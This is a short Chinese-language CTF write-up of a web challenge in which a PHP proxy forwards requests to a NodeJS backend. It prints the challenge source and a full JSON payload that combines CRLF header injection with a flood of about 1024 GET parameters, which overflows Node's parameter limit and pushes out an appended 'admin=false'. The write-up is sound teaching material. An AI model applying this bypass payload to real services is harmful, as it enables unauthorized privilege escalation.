tags:: [[CTFWEB/NodeJS]], [[CTFWEB/SSRF]]

- # 分析
	- 一眼ssrf攻击后端的NodeJS，需要伪造header和GET param
- # 伪造Header
	- 快使用CRLF!
	- ```json
	  "headers":["Aaa: Bbb\r\nadmin: true"]
	  ```
-
- # 伪造GET param
	- 题目会在传入的GET参数后面拼接`&admin=false`
	- 我们需要传入大量GET param，利用NodeJS中GET param的数量限制挤掉后面的`&admin=false`
- # 最终payload
	- id:: 6547a3b5-68ac-4744-bb9f-bb446e42fabd
	  ```json
	  {
	    "headers":["Aaa: Bbb\r\nadmin: true"],
	    "params":{
	      "admin":"true",
	      "x0":0,
	      "x1":1,
	      "x2":2,
	      "x3":3,
	      "x4":4,
	      "x5":5,
	      "x6":6,
	      "x7":7,
	      "x8":8,
	      "x9":9,
	      "x10":10,
	      "x11":11,
	      "x12":12,
	      "x13":13,
	      "x14":14,
	      "x15":15,
	      //... 略
	  	"x1023":1023,
	    }
	  }
	  ```
- # 题目
	- ```php
	  <?php
	  error_reporting(E_ALL);
	  $url = 'http://127.0.0.1:3000/flag?';
	  $input = file_get_contents('php://input');
	  if(!$input) {
	      highlight_file(__FILE__);
	      die();
	  }
	  $headers = (array)json_decode($input)->headers;
	  for($i = 0; $i < count($headers); $i++){
	      $offset = stripos($headers[$i], ':');
	      $key = substr($headers[$i], 0, $offset);
	      $value = substr($headers[$i], $offset + 1);
	      if(stripos($key, 'admin') > -1 && stripos($value, 'true') > -1){
	          die('try hard');
	      }
	  }
	  $params = (array)json_decode($input)->params;
	  $url .= http_build_query($params);
	  $url .= '&admin=false';
	  var_dump($url);
	  var_dump($headers);
	  $ch = curl_init();
	  curl_setopt($ch, CURLOPT_URL, $url);
	  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	  curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000);
	  curl_setopt($ch, CURLOPT_NOBODY, FALSE);
	  $result = curl_exec($ch);
	  curl_close($ch);
	  echo $result;
	  var_dump($result);
	  
	  ```